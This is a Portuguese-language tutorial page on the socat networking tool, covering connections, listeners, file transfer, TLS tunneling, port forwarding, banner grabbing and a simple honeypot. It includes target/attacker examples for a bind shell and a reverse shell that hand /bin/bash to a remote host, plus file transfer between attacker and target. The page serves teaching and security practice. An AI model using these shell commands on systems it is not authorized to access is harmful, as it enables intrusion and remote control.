---
id: socat
title: socat
---

O `socat` (**SO**cket **CAT**) é uma ferramenta flexível de linha de comando que
permite a transferência de dados entre dois endpoints, sejam eles soquetes
TCP/UDP, portas seriais, arquivos, pipes ou até mesmo conexões criptografadas.
Ele pode ser comparado ao `nc` (netcat), mas oferece mais recursos e opções de
configuração.

## Principais usos

- Redirecionamento de portas (TCP e UDP);
- Tunelamento de conexões, com ou sem criptografia;
- Encapsulamento de dados em SSL/TLS;
- Criação de proxies TCP simples;
- Escuta e teste de daemons de rede;
- Transferência de arquivos entre hosts;
- Exposição de shell (bind shell e reverse shell);
- Encaminhamento de conexões para processos locais, portas seriais, etc.

## Conectando

Assim como o `nc`, o `socat` pode efetuar conexões TCP. Porém, a sintaxe dele é
diferente, pois precisamos especificar dois "addresses" (endereços) que ele irá
conectar ou escutar.

### Conexão TCP

Para estabelecer uma conexão TCP a um destino 172.16.1.4 na porta 110, podemos
utilizar:

```bash
socat STDIO TCP:172.16.1.4:110
```

:::info
**STDIO**: indica que o socat usará a entrada/saída padrão do terminal;  
**TCP:172.16.1.4:110**: indica que iremos utilizar TCP, conectando na porta 110
do IP 172.16.1.4.
:::

### Conexão UDP

Para utilizar UDP em vez de TCP, basta trocar a especificação:

```bash
socat STDIO UDP:127.0.0.1:9000
```

## Escutando

O socat também permite que você crie um *listener*, ou seja, uma porta que
ficará escutando conexões externas (semelhante ao `nc -l`).

### Escuta TCP

Para escutar na porta 5050 em modo TCP:

```bash
socat TCP-LISTEN:5050,fork STDOUT
```

:::info
**TCP-LISTEN:5050**: indica que vamos escutar na porta 5050 usando TCP;
**fork**: faz com que, a cada nova conexão, o processo seja duplicado (*fork*),
permitindo aceitar múltiplas conexões sequencialmente;
**STDOUT**: direciona a saída para a saída padrão.
:::

Depois, no outro lado, podemos nos conectar com:

```bash
socat STDIO TCP:192.168.0.10:5050
```

### Escuta UDP

Para escutar na porta 9000 com UDP:

```bash
socat UDP-LISTEN:9000,fork STDOUT
```

## Transferência de Arquivos

O socat pode ser utilizado para transferir arquivos ou dados de forma semelhante
ao `nc`, pois ele simplesmente redireciona fluxos de dados.

### Upload

No alvo (que receberá o arquivo):

```bash
touch arquivo_recebido
socat TCP-LISTEN:5050,fork OPEN:arquivo_recebido
```

:::info
Note que criamos o arquivo antes, mesmo que vazio, ele precisa existir.  
**OPEN:arquivo_recebido**: faz com que tudo que chegar na porta 5050 seja
escrito diretamente no arquivo `arquivo_recebido`.
:::

No atacante (que enviará o arquivo):

```bash
socat OPEN:arquivo_para_enviar TCP:172.16.2.6:5050
```

### Download

No atacante (onde está o arquivo):

```bash
socat TCP-LISTEN:5050,fork OPEN:arquivo_para_enviar
```

No alvo (que vai iniciar a conexão para baixar o arquivo):

```bash
touch arquivo_recebido
socat TCP:172.16.2.5:5050 OPEN:arquivo_recebido
```

## Encaminhando Saída de Comandos

Podemos redirecionar a saída de um comando para o socat a fim de enviar essa
saída através de uma conexão de rede.
Por exemplo, para enviar a saída de `cat /etc/os-release` para quem se conectar
na porta 5050:

```bash
socat TCP-LISTEN:5050,fork SYSTEM:'cat /etc/os-release'
```

Quando alguém se conectar usando outro `socat` ou `nc` nessa porta, receberá o
conteúdo do arquivo `/etc/os-release`.

## Expondo Shell

Assim como no nc, é possível usar o socat para expor uma shell.

### Bind Shell

Executado na máquina-alvo para abrir a porta 5050 e expor `/bin/bash`:

```bash
socat TCP-LISTEN:5050,fork EXEC:/bin/bash
```

:::info
**EXEC:/bin/bash**: executa o comando /bin/bash e redireciona o I/O
(Input/Output).
:::

Depois, no atacante, basta conectar:

```bash
socat STDIO TCP:192.168.0.10:5050
```

### Reverse Shell

Executado na máquina-alvo, que fará a conexão ativa de volta para 192.168.0.100
na porta 5050, expondo /bin/bash:

```bash
socat TCP:192.168.0.100:5050 EXEC:/bin/bash
```

No atacante, precisamos escutar:

```bash
socat TCP-LISTEN:5050,fork STDOUT
```

## Encapsulando em SSL/TLS

Um dos maiores diferenciais do socat em relação ao `nc` é a capacidade de
estabelecer conexões criptografadas usando SSL/TLS de maneira nativa.

### Exemplo de Conexão Criptografada

Servidor escutando em TLS:

```bash
socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,verify=0,fork STDOUT
```

Cliente conectando-se ao servidor via TLS:

```bash
socat STDIO OPENSSL:meuservidor.com:443,verify=0
```

:::info
**Dica**: A opção `verify=0` desabilita a verificação do certificado, o que pode
ser útil em testes ou ambientes de laboratório. Em produção, deve-se usar
verificação adequada.
:::

## Encaminhando Portas (Port Forwarding)

Com o `socat`, é simples criar um túnel redirecionando a porta local para outra
porta/host.

Por exemplo, se queremos que conexões na porta 8080 do host local sejam
encaminhadas para `192.168.1.100:80`, podemos usar:

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

Qualquer conexão na porta local 8080 será então encaminhada para a porta 80 do
endereço 192.168.1.100.

## Escaneando Portas

O `socat` não é a melhor ferramenta para varredura de portas (como o `nc` ou o
`nmap`), mas pode ser usado em scripts e one-liners para verificar a
disponibilidade de um determinado serviço.

Para testar se a porta 22 de um host está aberta, podemos observar o retorno:

```bash
socat - TCP:172.16.1.5:22
```

Caso a conexão seja estabelecida, o `socat` aguardará dados (ou fechará se não
houver resposta). Se a porta estiver fechada ou filtrada, a conexão falhará e o
`socat` retornará erro.

Para varreduras mais elaboradas, `nc`, `ncat` ou nmap são mais adequados.

## Banner Grabbing

Também podemos fazer o "banner grabbing" de um serviço, enviando comandos e
analisando as respostas diretamente no terminal.

### HTTP

```bash
printf 'HEAD / HTTP/1.0\n\n' | \
  socat STDIO TCP:www.alvo.com:80
```

Ao digitar o comando `HEAD / HTTP/1.0` e pressionar Enter duas vezes (no comando
acima represantado pelo `\n\n`), veremos o banner de resposta do servidor HTTP.

### FTP

```bash
socat STDIO TCP:192.168.1.100:21
USER anonymous
PASS anonymous
```

## Honeypot Simples

O socat pode ser usado de forma rudimentar para montar um *honeypot*, embora
existam soluções mais completas voltadas a isso.
Um exemplo seria apenas enviar um banner falso e registrar as entradas:

```bash
cat << EOF > fake_ftp_banner.txt
220 ProFTPD 1.3.4a Server (Ubuntu)
EOF
```

```bash
while true; do
  socat TCP-LISTEN:21,fork SYSTEM:'cat fake_ftp_banner.txt' |& tee -a ftp.log
  echo "$(date)" >> ftp.log
done
```

Esse script simples escutará na porta 21 e, ao receber uma conexão, enviará o
conteúdo do fake_ftp_banner.txt. O `tee` registrará tudo no arquivo ftp.log.

## Conclusão

O `socat` é uma ferramenta poderosa, que vai além do nc em muitos aspectos,
principalmente devido ao suporte avançado a SSL/TLS, suporte a portas seriais,
fork, e diversas outras opções de endereçamento. Para quem precisa de conexões
mais versáteis e seguras, o socat é um excelente aliado, seja para simples
testes de portas ou para a construção de túneis criptografados em ambientes de
produção.
